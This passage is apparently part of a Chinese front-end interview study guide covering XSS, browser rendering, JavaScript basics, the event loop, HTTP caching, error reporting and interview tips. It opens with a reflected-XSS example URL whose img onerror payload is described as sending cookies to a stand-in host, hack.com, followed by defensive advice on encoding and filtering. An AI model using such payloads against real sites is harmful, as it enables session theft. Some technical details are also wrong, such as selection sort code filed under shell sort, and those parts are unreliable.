+
+**构造攻击代码：**
+hacker在发现站点对应的漏洞之后，基本可以确定是使用“反射型”或者“存储型”。对于反射型这个很简单了，执行类似代码：
+```
+https://www.toutiao.com/search?item=<img onerror="new Image().src='//hack.com?c=' src='null'>"
+```
+
+大家知道很多站点都提供搜索服务，这里的item字段就是给服务端提供关键词。如果hacker将关键词修改成可执行的JavaScript语句，如果服务端不加处理直接将类似代码回显到页面，XSS代码就会被执行。
+
+
+这段代码的含义是告诉浏览器加载一张图片，图片的地址是空，根据加载机制空图片的加载会触发Element的onerror事件，这段代码的onerror事件是将本地cookie传到指定的网站。
+
+
+#### XSS的防范措施：
+
+
+
+**编码:**
+对于反射型的代码，服务端代码要对查询进行编码，主要目的就是将查询文本化，避免在浏览器解析阶段转换成DOM和CSS规则及JavaScript解析。
+
+
+**DOM Parse和过滤:**
+从XSS工作的原理可知，在服务端进行编码，在模板解码这个过程对于富文本的内容来说，完全可以被浏览器解析到并执行，进而给了XSS执行的可乘之机。
+
+为了杜绝悲剧发生，我们需要在浏览器解析之后进行解码，得到的文本进行DOM parse拿到DOM Tree，对所有的不安全因素进行过滤，最后将内容交给浏览器，达到避免XSS感染的效果。
+
+
+## 渲染机制类
+
+### DOCTYPE
+DTD(document type definition,文档类型定义)是一系列的语法规则，用来定义XML或(X)HTML的文件类型。浏览器会使用它来判断文档类型，决定使用何种协议来解析，以及切换浏览器模式。
+
+DOCTYPE是用来声明文档类型和DTD规范的，一个主要的用途便是文件的合法性检验。如果文件代码不合法，那么浏览器解析时便会出错。
+
+HTML5
+`<!DOCTYPE html>`
+
+
+### 浏览器渲染过程
+1. 根据HTML结构生成DOM Tree
+2. 根据CSS生成CSSOM
+3. 将DOM和CSSOM整合形成RenderTree,同时进行Layout
+4. 根据RenderTree开始渲染(Painting)和展示(Display)
+5. 遇到`<script>`时，会执行并阻塞渲染
+
+### SSR
+SSR，服务器渲染。简单来说就是，服务器将每个要展示的页面都运行完成后，将整个相应流传送给浏览器，所有的运算在服务器端都已经完成，浏览器只需要解析 HTML 就行。
+
+
+### 浏览器输入url到加载的过程
+[网页链接](http://blog.csdn.net/xingxingba123/article/details/52743335)
+1. 首先，在浏览器地址栏中输入url
+2. 浏览器先查看浏览器缓存-系统缓存-路由器缓存，如果缓存中有，会直接在屏幕中显示页面内容。若没有，则跳到第三步操作。
+3. 在发送http请求前，需要域名解析(DNS解析)，解析获取相应的IP地址。
+4. 浏览器向服务器发起tcp连接，与浏览器建立tcp三次握手。
+5. 握手成功后，浏览器向服务器发送http请求，请求数据包。
+6. 服务器处理收到的请求，将数据返回至浏览器
+7. 浏览器收到HTTP响应
+8. 读取页面内容，浏览器渲染，解析html源码
+9. 生成Dom树、解析css样式、js交互
+10. 客户端和服务器交互
+11. ajax查询
+
+**步骤2的具体过程是：**
+* 浏览器缓存：浏览器会记录DNS一段时间，因此，只是第一个地方解析DNS请求；
+* 操作系统缓存：如果在浏览器缓存中不包含这个记录，则会使系统调用操作系统，获取操作系统的记录(保存最近的DNS查询缓存)；
+* 路由器缓存：如果上述两个步骤均不能成功获取DNS记录，继续搜索路由器缓存；
+* ISP缓存：若上述均失败，继续向ISP搜索。
+
+>Internet Service Provider，互联网服务提供商
+
+### 重排Reflow
+DOM结构中的各个元素都有自己的盒子(模型)，这些都需要浏览器根据各种样式来计算并根据计算结果将元素放到它应该出现的位置，这个过程称之为Reflow。
+
+#### 触发Reflow
+当你增加,删除,修改DOM结点时，会导致Reflow或Repaint
+当你移动DOM位置时，或者搞个动画的时候
+当你修改CSS样式的时候
+当你Resize窗口的时候(移动端没有这个问题)，或者是滚动的时候
+当你修改网页的默认字体时
+
+
+
+### 重绘Repaint
+当各种盒子的位置，大小以及其他属性，例如颜色、字体大小等都确定下来后，浏览器于是便把这些元素按照各自的特性绘制一遍，于是页面的内容出现了，这个过程称之为repaint。
+
+#### 触发Repaint
+* DOM改动
+* CSS改动
+
+
+#### 减少Repaint次数
+利用DocumentFragment
+
+DocumentFragment 接口表示一个没有父级文件的最小文档对象。它被当做一个轻量版的 Document 使用，用于存储已排好版的或尚未打理好格式的XML片段。最大的区别是因为DocumentFragment不是真实DOM树的一部分，**它的变化不会引起DOM树的重新渲染的操作(reflow) ，且不会导致性能等问题。**
+
+>所有的节点会被一次插入到文档中，而这个操作仅发生一个重渲染的操作，而不是每个节点分别被插入到文档中，因为后者会发生多次重渲染的操作。
+
+
+
+可以使用document.createDocumentFragment 方法或者构造函数来创建一个空的 DocumentFragment.
+
+
+
+### 渲染优化
+* CSS放前面，JS放后面
+* 懒加载
+* 减少DOM查询，对DOM查询做缓存
+* 减少DOM操作，多个操作尽量合并在一起执行
+* 事件节流
+* 尽早执行操作(如DOMContentLoaded)
+
+
+#### 合并DOM插入
+```
+    var listNode = document.getElementById('list');
+    var frag = document.createDocumentFragment();
+    var x, li;
+    for (x = 0; x < 10; x++) {
+        li = document.createElement('li');
+        li.innerHTML = "List item" + x;
+        frag.appendChild(li);
+    }
+    listNode.appendChild(frag);
+```
+#### 事件节流
+```
+    var textarea = document.getElementById('text');
+    var timeoutId;
+    textarea.addEventListener('keyup', function () {
+        if (timeoutId) {
+            clearTimeout(timeoutId);
+        }
+        timeoutId = setTimeout(function () {
+            //触发 change 事件
+        }, 1000);
+    })
+```   
+### 尽早操作
+```
+    window.addEventListener('load', function () {
+        // 页面的全部资源加载完才会执行，包括图片，视频等
+    });
+
+    document.addEventListener('DOMContentLoaded', function () {
+        // DOM 渲染完成即可，此时图片，视频还可能没有加载完
+    });
+```
+
+
+### 加载资源优化
+* 静态资源的压缩合并
+* 静态资源的缓存
+* 使用CND让资源加载更快
+* 使用SSR后端渲染，数据直接突入到HTML中
+
+
+## js基础类
+
+### JavaScript中有基本数据类型
+* undefined
+* null
+* boolean
+* number
+* string
+* object
+
+
+### ECMAScript 和 JavaScript的关系
+JavaScript是在浏览器执行的语言， 是因为它有BOM和DOM，前者提供了一些诸如window.open的函数， 后者提供了一些如document.querySelector的函数。 如果想让它在其他非浏览器平台运行的话， 肯定是不能有这两个的， 而JavaScript - BOM - DOM = ECMAScript。 比如Node平台， 内部的语言就是ECMAScript。 当然因为习惯， 即使我们在用Node的时候， 很多时候也是直接叫JavaScript而不是ES。
+
+
+### typeof 运算符
+* typeof undefined 结果 “undefined”
+* typeof ‘abc’ 结果 “string”
+* typeof 123 结果 “number”
+* typeof true 结果 “boolean”
+* typeof {} 结果 “object”
+* typeof [] 结果 “object”
+* **typeof null 结果 “object”**
+* typeof console.log 结果 “function”
+
+### == 运算符
+100 = ‘100’ //true 0 == ‘’ //true null == undefined //true
+
+if(obj.a == null){ // 这里相当于obj.a === null || obj.a === undefined 的简写形式 // 这是jquery源码中的推荐写法 }
+
+
+
+### 如何理解JSON
+JSON只不过是一个JS对象而已
+
+JSON.stringify({a:10,b:20}) 
+JSON.parse(‘{“a”:10,”b”:20}’)
+
+
+### 判断一个变量会被当作true还是false
+var a = 100 
+console.log(!!a)
+
+
+### 如何准确判断一个变量是数组类型
+```
+var arr = [];
+console.log(arr instanceof Array); //true
+console.log(typeof arr);//object,typeof是无法判断是否是数组的
+```
+
+### 语法糖
+* var a = {} 其实是 var a = new Object() 的语法糖
+* var a = [] 其实是 var a = new Array() 的语法糖
+* function Foo(){…} 其实是 var Foo = new Function(…)
+
+>所有的引用类型（数组、对象、函数），都具有对象特性，即可自由扩展属性（除了“null”以外）
+
+### 数组API
+* forEach 遍历所有元素
+* every 判断所有元素是否都符合条件
+* some 判断是否有至少一个元素符合条件
+* sort 排序
+* map 对元素重新组装，生成新数组
+* filter 过滤符合条件的元素
+
+
+#### 数组 sort
+```
+    var arr = [1, 2, 3, 4, 5];
+    var arr2 = arr.sort(function (a, b) {
+        //从小到大
+        // return a - b
+
+
+        //从大到小
+        return b - a;
+    });
+```    
+#### 数组 map
+```
+    var arr = [1, 2, 3, 4];
+    var arr2 = arr.map(function (item, index, array) {
+        //将元素重新组装，并返回
+        return '<b>' + item + '</b>'
+    });
+```
+#### 数组 filter
+```
+    var arr = [1,2,3]
+    var arr2 = arr.filter(function (item,index) {
+        // 通过某个条件过滤数组
+           if(item >= 2){
+             return true
+           }
+        
+    })
+```    
+### 写一个能遍历对象和数组的forEach函数
+```
+function forEach(obj,fn) {
+    var key
+    if(obj instanceof Array){
+        //准确判断是不是数组
+        obj.forEach(function(item,index){
+            fn(index,item)
+        })
+    } else {
+        //不是数组对象    
+        for(key in obj){
+            fn(key, obj[key])
+        }
+    }   
+}
+```
+
+
+### DOM节点的Attribute和property有何区别
+* property 只是一个JS对象的属性的修改
+* Attribute 是对html标签属性的修改
+
+
+### location
+```
+console.log(location.href); //http://localhost:63342/untitled2/test.html?_ijt=qgpv4jmr3aio5urdkukkjtts47
+console.log(location.protocol); //http:
+console.log(location.pathname); ///test/abc.html(本地位置)
+console.log(location.search); //?_ijt=qgpv4jmr3aio5urdkukkjtts47
+console.log(location.hash);
+```
+
+**hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。**
+
+
+
+### 通用事件绑定
+```
+ function bindEvent(elem, type, fn) {
+        elem.addEventListener(type, fn);
+    }
+
+    var a = document.getElementById('link1');
+    bindEvent(a, 'click', function (e) {
+        e.preventDefault();
+        alert('clicked-self');
+    })
+```
+
+### Ajax
+```
+  var xhr = new XMLHttpRequest();
+    xhr.open("GET", "/api", false);
+    xhr.onreadystatechange = function () {
+        // 这里的函数异步执行
+        if (xhr.readyState == 4) {
+            if (xhr.status == 200) {
+                alert(xhr.responseText);
+            }
+        }
+    }
+```
+
+readyState
+* 0 (未初始化) 还没有调用send()方法
+* 1 (载入) 已调用send()方法，正在发送请求
+* 2 (载入完成) send()方法执行完成，已经接收到全部响应内容
+* 3 (交互) 正在解析响应内容
+* 4 (完成) 响应内容解析完成，可以在客户端调用了
+
+
+
+### status
+* 2xx 表示成功处理请求
+* 3xx 需要重定向，浏览器直接跳转
+* 4xx 客户端请求错误
+* 5xx 服务器端错误
+
+
+### cookie
+* 本身用于客户端和服务器端通信、
+* 但是它有本地存储的功能，于是就被“借用”
+* 使用document.cookie = … 获取和修改即可
+
+
+
+#### 缺点
+* 存储量太小，只有4KB
+* 所有的http请求都带着，会影响获取资源的效率
+* API简单，需要封装
+
+### locationStorage 和 sessionStorage
+* HTML5专门为存储而设计，最大容量5M
+* API简洁易用
+* localStorage.setItem(key,value);localStorage.getItem(key)
+
+
+### navigator & screen
+```
+// navigator
+    var ua = navigator.userAgent;
+    var isChrome = ua.indexOf('Chrome');
+    console.log(isChrome);
+
+// screen
+    console.log(screen.width);
+    console.log(screen.height);
+```
+
+
+
+## js运行机制类
+**js是单线程的**(一个时间之内只能干一件事)
+
+
+
+```
+console.log('A')
+while(true){
+
+}
+console.log('B')
+```
+// 只会输出A (因为是同步任务)
+
+
+
+### 异步任务
+* setTimeout和setInterval
+* DOM事件
+* ES6中的Promise
+
+需要注意的是，setTimeout(不止它)只是将事件插入了"任务队列"，必须等到当前代码（执行栈）执行完，主线程才会去执行它指定的回调函数。要是当前代码耗时很长，有可能要等很久，**所以并没有办法保证，回调函数一定会在setTimeout()指定的时间执行。**
+
+>http://www.ruanyifeng.com/blog/2014/10/event-loop.html
+
+### 异步执行的运行机制
+
+1. 所有同步任务都在主线程上执行，形成一个执行栈（execution context stack）。
+2. 主线程之外，还存在一个"任务队列"（task queue）。只要异步任务有了运行结果，就在"任务队列"之中放置一个事件。
+3.  一旦"执行栈"中的所有同步任务执行完毕，系统就会读取"任务队列"，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。
+4. 主线程不断重复上面的第三步。
+
+![enter description here][7]
+
+
+
+只要主线程空了，就会去读取"任务队列"，这就是JavaScript的运行机制。这个过程会不断重复。
+
+
+
+
+### 事件和回调函数
+"任务队列"是一个事件的队列（也可以理解成消息的队列），IO设备完成一项任务，就在"任务队列"中添加一个事件，表示相关的异步任务可以进入"执行栈"了。主线程读取"任务队列"，就是读取里面有哪些事件。
+
+"任务队列"中的事件，除了IO设备的事件以外，还包括一些用户产生的事件（比如鼠标点击、页面滚动等等）。只要指定过回调函数，这些事件发生时就会进入"任务队列"，等待主线程读取。
+
+所谓"回调函数"（callback），就是那些会被主线程挂起来的代码。异步任务必须指定回调函数，当主线程开始执行异步任务，就是执行对应的回调函数。
+
+
+"任务队列"是一个先进先出的数据结构，排在前面的事件，优先被主线程读取。主线程的读取过程基本上是自动的，只要执行栈一清空，"任务队列"上第一位的事件就自动进入主线程。但是，由于存在后文提到的"定时器"功能，主线程首先要检查一下执行时间，某些事件只有到了规定的时间，才能返回主线程。
+
+### Event Loop
+主线程从"任务队列"中读取事件，这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环）。
+
+![enter description here][8]
+
+上图中，主线程运行的时候，产生堆（heap）和栈（stack），栈中的代码调用各种外部API，它们在"任务队列"中加入各种事件（click，load，done）。只要栈中的代码执行完毕，主线程就会去读取"任务队列"，依次执行那些事件所对应的回调函数。
+
+
+**执行栈中的代码（同步任务），总是在读取"任务队列"（异步任务）之前执行**。请看下面这个例子。
+```
+ var req = new XMLHttpRequest();
+    req.open('GET', url);    
+    req.onload = function (){};    
+    req.onerror = function (){};    
+    req.send();
+```
+
+上面代码中的req.send方法是Ajax操作向服务器发送数据，它是一个异步任务，意味着只有当前脚本的所有代码执行完，系统才会去读取"任务队列"。所以，它与下面的写法等价。
+
+
+```
+ var req = new XMLHttpRequest();
+    req.open('GET', url);
+    req.send();
+    req.onload = function (){};    
+    req.onerror = function (){};   
+```
+
+>回调函数的部分（onload和onerror），在send()方法的前面或后面无关紧要
+
+
+
+## 页面性能类
+提升页面性能的方法有哪些？
+1. 资源压缩合并，减少HTTP请求
+2. 非核心代码异步加载(异步加载方式，异步加载原理)
+3. 利用浏览器缓存(缓存的分类，缓存的原理)
+4. 利用CDN
+5. 预解析DNS
+`<meta http-equiv="x-dns-prefetch-control" content="on">`
+`<link rel="dns-prefetch" href="//host_name_to_prefetch.com">`
+
+
+
+
+### 异步加载
+1. 动态脚本加载
+2. defer
+3. async
+
+
+```
+<script type="text/javascript" src="b1j6wg/defer2.js" defer>		</script>
+```
+
+
+```
+<script type="text/javascript" src="b1j6wg/async1.js" async>
+</script>
+```
+
+异步加载的区别：
+1. defer是在HTML解析完之后才会执行，如果是多个，按照加载的顺序依次执行
+2. async是在加载完之后立即执行的，如果是多个，执行顺序和加载顺序无关
+
+
+
+
+### 浏览器缓存
+[网站链接](https://www.cnblogs.com/shixiaomiao1122/p/7591556.html)
+
+
+
+* 强缓存 (直接拿来用）
+用户发送的请求，直接从客户端缓存中获取，不发送请求到服务器，不与服务器发生交互行为。
+  * Expires Expires:Thu,21 Jan 2017 23:39:02 GMT(绝对时间 服务器下发的)
+  **存在的问题：服务器时间与客户端时间的不一致，就会导致缓存跟期待效果出现偏差。**
+  * Cache-Control Cache-Control:max-age=3600(相对时间 单位:秒 客户端)
+* 协商缓存 (问一下服务器)
+用户发送的请求，发送到服务器后，由服务器判定是否从缓存中获取资源。
+  * Last-Modified if-Modified-Since Last-Modified:Wed,26 Jan 2017 00:35:11 GMT
+  * Etag if-None-Match (相当于hash值)
+
+
+
+>两者的区别：从名字就可以看出，强缓存不与服务器交互，而协商缓存则需要与服务器交互。
+
+
+![enter description here][9]
+
+
+
+
+
+**简单介绍下Cache-Control的属性设置:**
+1) max-age: 设置缓存的最大的有效时间，单位为秒（s）。max-age会覆盖掉Expires
+2) s-maxage: 只用于共享缓存，比如CDN缓存（s -> share）。与max-age 的区别是：max-age用于普通缓存，
+而s-maxage用于代理缓存。如果存在s-maxage,则会覆盖max-age 和 Expires.
+3) public：响应会被缓存，并且在多用户间共享。默认是public。
+4) private: 响应只作为私有的缓存，不能在用户间共享。如果要求HTTP认证，响应会自动设置为private。
+5) no-cache: 指定不缓存响应，表明资源不进行缓存。但是设置了no-cache之后并不代表浏览器不缓存，而是在缓存前要向服务器确认资源是否被更改。因此有的时候只设置no-cache防止缓存还是不够保险，还可以加上private指令，将过期时间设为过去的时间。
+6) no-store: 绝对禁止缓存。
+7) must-revalidate: 如果页面过期，则去服务器进行获取。
+
+![enter description here][10]
+
+
+
+1) 查看是否有cache-control 的max-age / s-maxage , 如果有，则用服务器时间date值 + max-age/s-maxage 的秒数计算出新的过期时间，将当前时间与过期时间进行比较，判断是否过期
+2) 查看是否有cache-control 的max-age / s-maxage，没有，则用expires 作为过期时间比较
+
+![enter description here][11]
+
+
+
+判断过程执行完后，如果判定为未过期，则使用客户端缓存，那么就是属于"强缓存"，否则，跟服务器协商是否使用缓存，这就属于"协商缓存"
+
+
+
+![enter description here][12]
+
+
+到这一步的时候，浏览器会向服务器发送请求，同时如果上一次的缓存中有Last-modified 和 Etag 字段，
+浏览器将在request header 中加入**If-Modified-Since（对应于Last-modified）**， 和**If-None-Match（对应于Etag）**。
+
+
+* Last-modified: 表明请求的资源上次的修改时间。
+* If-Modified-Since：客户端保留的资源上次的修改时间。
+* Etag：资源的内容标识。（不唯一，通常为文件的md5或者一段hash值，只要保证写入和验证时的方法一致即可）
+* If-None-Match： 客户端保留的资源内容标识。
+
+
+>1) 分布式系统尽量关闭Etag，因为每台机器生成的Etag都不一样。
+>2) 分布式系统里多台机器间文件的Last-Modified必须一致，以免负载均衡不同导致对比失败。
+
+
+最后附上一张，用户行为影响浏览器的缓存行为。
+
+![enter description here][13]
+
+
+
+
+## 错误监控类
+
+### 前端错误的分类：
+* 即时运行错误(代码错误)
+* 资源加载错误
+
+即时运行错误的捕获方式：
+1. try...catch
+2. window.onerror
+
+资源加载错误捕获方式：
+1. object.onerror
+2. performance.getEntries()
+3. Error事件捕获
+
+
+```
+Error事件捕获
+
+window.addEventListener('error',function(e){
+    console.log('捕获',e)
+},false)  //设置false 因为只能在捕获阶段响应
+```
+
+**延伸：跨域的js运行错误可以捕获吗，错误提示什么？**
+1. 在script标签增加 crossorigin属性
+2. 设置js资源响应头Access-Control-Allow-Origin:*
+
+
+### 上报错误的基本原理
+1. 采用Ajax通信方式上报
+2. **利用Image对象上报**
+
+
+```
+利用Image对象上报
+
+<script>
+    (new Image()).src = 'http://baidu.com/test?error=tksjk...'
+    // ?后面就可以添加错误信息了
+</script>    
+```
+
+## 算法类
+[快速排序](https://segmentfault.com/a/1190000009426421)
+[选择排序](https://segmentfault.com/a/1190000009366805)
+[希尔排序](https://segmentfault.com/a/1190000009461832)
+[堆栈](https://juejin.im/entry/58759e79128fe1006b48cdfd)
+[队列](https://juejin.im/entry/58759e79128fe1006b48cdfd)
+[链表](https://juejin.im/entry/58759e79128fe1006b48cdfd)
+[深入学习递归](https://segmentfault.com/a/1190000009857470)
+[波兰式和逆波兰式](http://www.cnblogs.com/chenying99/p/3675876.html)
+[波兰式和逆波兰式github](https://github.com/Tairraos/rpn.js/blob/master/rpn.js)
+
+
+
+
+### 快速排序
+```
+var quickSort = function(arr) {
+    if (arr.length <= 1) { return arr; }
+    var pivotIndex = Math.floor(arr.length / 2);   //基准位置（理论上可任意选取）
+    var pivot = arr.splice(pivotIndex, 1)[0];  //基准数
+    var left = [];
+    var right = [];
+    for (var i = 0; i < arr.length; i++){
+        if (arr[i] < pivot) {
+            left.push(arr[i]);
+        } else {
+            right.push(arr[i]);
+        }
+    }
+    return quickSort(left).concat([pivot], quickSort(right));  //链接左数组、基准数构成的数组、右数组
+};
+```
+
+>使用arr.splice是为了取出元素(返回删除值)
+>concat只能链接数组
+
+
+
+
+### 希尔排序
+```
+function selectionSort(arr) {
+    var len = arr.length;
+    var minIndex, temp;
+    for (var i = 0; i < len - 1; i++) {
+        minIndex = i;
+        for (var j = i + 1; j < len; j++) {
+            if (arr[j] < arr[minIndex]) {     // 寻找最小的数
+                minIndex = j;                 // 将最小数的索引保存
+            }
+        }
+        temp = arr[i];
+        arr[i] = arr[minIndex];
+        arr[minIndex] = temp;
+    }
+    return arr;
+}
+```
+
+
+
+
+## 三面/四面
+* 业务能力
+* 团队协作能力
+* 事务推动能力
+* 带人能力
+* 其他能力
+
+### 业务能力
+* 做过什么业务？
+* 负责的业务有什么业绩？
+* 使用了什么技术方案？
+* 突破了什么技术难点？
+* 遇到了什么问题？
+* 最大收获是什么？
+
+
+## 终面(hr面)
+* 乐观积极
+* 主动沟通
+* 逻辑顺畅
+* 上进有责任心
+* 有主张，做事果断
+
+### 话题
+1. 职业竞争力
+2. 职业规划
+
+
+
+#### 职业竞争力
+为什么这个岗位要给你？
+1. 业务能力
+2. 思考能力(对一件事可以从不同的角度去思考，找到最优解)
+3. 学习能力(不断学习新的业务和技术，沉淀，总结)
+4. 无上限的付出(对于无法解决的问题可以加班)
+
+#### 职业规划
+1. 目标是什么(在业务上成为专家，在技术上成为大牛)
+2. 近阶段的目标(不断的学习积累各方面的经验，以学习为主)
+3. 长期目标(做几件很有价值的事情，如开源作品，技术框架)
+4. 方式方法(先完成业务上的主要问题，做到极致，然后逐步向目标靠拢)
+
+
+>适当赞美hr，希望多得到公司的资源，定期举办分享会...
+
+
+## 总结
+
+JD描述(job description)
+对于社招一定要看，对于校招可以忽略
+
+简历
+对照JD改写出相吻的简历，对于未掌握的技术栈快速复习理解。
+
+自我介绍
+一定要打草稿，展示什么优势，描述什么项目，切忌临场发挥
+
+**不要一味低头做事，多思考，学会沟通。**
+
+
+  [1]: https://pic4.zhimg.com/80/v2-0a9ca8952c83141250a2d9002e6d2047_hd.jpg
+  [2]: https://pic4.zhimg.com/80/v2-5b8d6e8b2b507352900c1ece00018855_hd.jpg
+  [3]: https://pic1.zhimg.com/80/v2-371eb702274af831df909b2c55d6a14b_hd.jpg
+  [4]: https://pic2.zhimg.com/80/v2-cc8365db5c9cc5ca003ce9afe88592e7_hd.jpg
+  [5]: https://pic2.zhimg.com/80/v2-5ebd48f09fac875f0bd25823c76ba7fa_hd.jpg
+  [6]: http://ww1.sinaimg.cn/large/0060lm7Tly1fjuz4jz285j30s90lmgo7.jpg
+  [7]: http://www.ruanyifeng.com/blogimg/asset/2014/bg2014100801.jpg
+  [8]: http://www.ruanyifeng.com/blogimg/asset/2014/bg2014100802.png
+  [9]: https://images2017.cnblogs.com/blog/621603/201709/621603-20170925143850526-746597755.png
+  [10]: https://images2017.cnblogs.com/blog/621603/201709/621603-20170925154122198-1817891039.png
+  [11]: https://images2017.cnblogs.com/blog/621603/201709/621603-20170925155532276-1195130673.png
+  [12]: https://images2017.cnblogs.com/blog/621603/201709/621603-20170925160222510-1108792969.png
+  [13]: https://images2017.cnblogs.com/blog/621603/201709/621603-20170925162600417-90375901.png
